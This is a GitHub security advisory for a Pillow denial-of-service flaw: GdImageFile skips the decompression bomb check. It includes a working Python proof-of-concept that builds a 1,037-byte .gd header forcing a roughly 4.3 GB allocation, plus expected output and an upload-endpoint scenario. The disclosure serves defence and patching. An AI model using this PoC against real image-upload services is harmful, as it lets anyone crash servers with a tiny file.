# [H] Pillow `GdImageFile._open()`: image dimensions accepted without `_decompression_bomb_check()`

## Summary
Severity: High
Advisory: GHSA-phj9-mv4w-65pm
CVE: CVE-2026-55380
CWE: CWE-789
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-07-20
Source: https://github.com/advisories/GHSA-phj9-mv4w-65pm
Type: github-advisory

## Affected
- PyPI: `pillow` — affected >=0 <12.3.0

## Details
## Description

`PIL/GdImageFile.py` `GdImageFile._open()` reads image dimensions from the GD 2.x header and stores them in `self._size` without calling `Image._decompression_bomb_check()`. Because `GdImageFile` is **not registered with `Image.register_open()`**, it never passes through the standard `Image.open()` code path that enforces Pillow's decompression bomb guard. The plugin exposes its own entry point — `PIL.GdImageFile.open(fp)` — which directly instantiates the class, fully bypassing the documented protection.

**Vulnerable code (`PIL/GdImageFile.py` lines 50–61):**

```python
def _open(self) -> None:
    s = self.fp.read(1037)
    if i16(s) not in [65534, 65535]:
        raise SyntaxError("Not a valid GD 2.x .gd file")
    self._mode = "P"
    self._size = i16(s, 2), i16(s, 4)   # ← unsigned 16-bit; max 65535 each
    # NO _decompression_bomb_check() call here ←
    ...
    self.tile = [ImageFile._Tile("raw", (0, 0) + self.size, 1037, "L")]
```

When `load()` is subsequently called on the returned image object:

```python
load() → load_prepare() → Image.core.new("P", (65535, 65535))
# ↑ C-level allocation of 4,294,836,225 bytes ≈ 4.3 GB — no Python bomb check precedes this
```

**Dimension arithmetic:**

| Field | Value |
|---|---|
| Maximum width from header | 65,535 (unsigned 16-bit) |
| Maximum height from header | 65,535 (unsigned 16-bit) |
| Maximum pixel count | 65,535 × 65,535 = **4,294,836,225** |
| `DecompressionBombError` threshold | 178,956,970 (2 × MAX_IMAGE_PIXELS) |
| **Overshoot ratio** | **24× above DecompressionBombError threshold** |
| Memory at max dimensions | **≈ 4.3 GB** (palette-mode: 1 byte/pixel) |
| Minimum attack file size | **1,037 bytes** (header only — no pixel data needed) |

**Comparison with safe sibling plugin (`WalImageFile`):**

`WalImageFile` is in the same category — not registered with `Image.open()`, loaded via its own `open()` helper. It was previously patched with the correct fix:

```python
# PIL/WalImageFile.py line 46 — CORRECT pattern (already patched)
self._size = i32(header, 32), i32(header, 36)
Image._decompression_bomb_check(self.size)   # ← present
```

`GdImageFile` was never updated to match, leaving a gap in protection.

## Steps to reproduce

**Proof of Concept script:**

```python
#!/usr/bin/env python3
"""
PoC: GdImageFile decompression bomb bypass
1037-byte crafted .gd file → 4.3 GB C-heap allocation, NO bomb check
"""
import io, struct
from PIL import GdImageFile, Image

# Build minimal 1037-byte GD 2.x palette-mode header:
#   sig(2) + width(2) + height(2) + true_color(1) + tindex(4) + colors_used(2) + palette(1024)
sig          = struct.pack(">H", 0xFFFE)       # 65534 = GD 2.x magic
w            = struct.pack(">H", 65535)         # max width
h            = struct.pack(">H", 65535)         # max height
true_color   = b"\x00"                          # 0 = palette mode
tindex       = struct.pack(">I", 0xFFFFFFFF)    # > 255 = no transparency
colors_used  = b"\x00\x00"
palette_data = b"\x00" * 1024
header = sig + w + h + true_color + tindex + colors_used + palette_data
assert len(header) == 1037

# Confirm: standard Image.open() path BLOCKS this size
try:
    Image._decompression_bomb_check((65535, 65535))
except Image.DecompressionBombError as e:
    print(f"[BLOCKED] Image.open() path: {e}")

# Vulnerable path: GdImageFile.open() has NO bomb check
img = GdImageFile.open(io.BytesIO(header))
print(f"[BYPASS] GdImageFile.open() succeeded: size={img.size}, mode={img.mode}")
print(f"         No _decompression_bomb_check called — 4.3 GB allocation not blocked")

# Trigger load_prepare() → Image.core.new("P", (65535, 65535))
try:
    img.load()
except OSError:
    print(f"[INFO]   load() OSError (no pixel data) — but C-heap allocation already attempted")

print(f"\n[MATH]   {65535 * 65535:,} pixels = {65535*65535 / (Image.MAX_IMAGE_PIXELS*2):.1f}× error threshold")
print(f"[MATH]   Attack file: 1,037 bytes only")
```

**Expected output:**
```
[BLOCKED] Image.open() path: Image size (4294836225 pixels) exceeds limit of 178956970
pixels, could be decompression bomb DOS attack.
[BYPASS] GdImageFile.open() succeeded: size=(65535, 65535), mode=P
         No _decompression_bomb_check called — 4.3 GB allocation not blocked
[INFO]   load() OSError (no pixel data) — but C-heap allocation already attempted

[MATH]   4,294,836,225 pixels = 24.0× error threshold
[MATH]   Attack file: 1,037 bytes only
```

**Verified live on Pillow 12.2.0.**

**Two attack paths:**

| Path | File size | Effect |
|---|---|---|
| Transient (header only) | **1,037 bytes** | `load_prepare()` attempts 4.3 GB C allocation → `OSError` after spike |
| Persistent (full pixel data) | ~4.3 GB | `load()` completes, 4.3 GB stays in memory for object lifetime |

For the transient path, a 1,037-byte file is all that is needed. The attacker does not need to upload a large file.

**Real-world scenario:**
```python
from PIL import GdImageFile

# Application accepts user-uploaded .gd files
img = GdImageFile.open(user_uploaded_file)   # succeeds — no bomb check
img.load()                                    # triggers 4.3 GB C-heap allocation
```

## Impact

- **Availability:** HIGH — a single 1,037-byte malicious `.gd` file causes the host process to attempt a ~4.3 GB C-heap allocation. On systems with insufficient memory this crashes the process. Repeatable — attacker can loop requests to keep the server down.
- **Confidentiality:** None
- **Integrity:** None
- **Authentication required:** No — any public endpoint accepting image uploads is affected
- **User interaction:** None

Any service that calls `PIL.GdImageFile.open(user_file)` followed by `.load()` (or any lazy-load trigger) is vulnerable. Because the attack requires only a 1,037-byte file, network bandwidth is not a constraint.

Confirmed unpatched on `python-pillow/Pillow` `main` branch as of 2026-06-08.

## References
- https://github.com/python-pillow/Pillow/security/advisories/GHSA-phj9-mv4w-65pm
- https://nvd.nist.gov/vuln/detail/CVE-2026-55380
- https://github.com/python-pillow/Pillow/commit/f39b0ae6624eb2d7c5c5d651d9bb5fdbd96a8675
- https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2256.yaml
- https://github.com/python-pillow/Pillow
- https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst
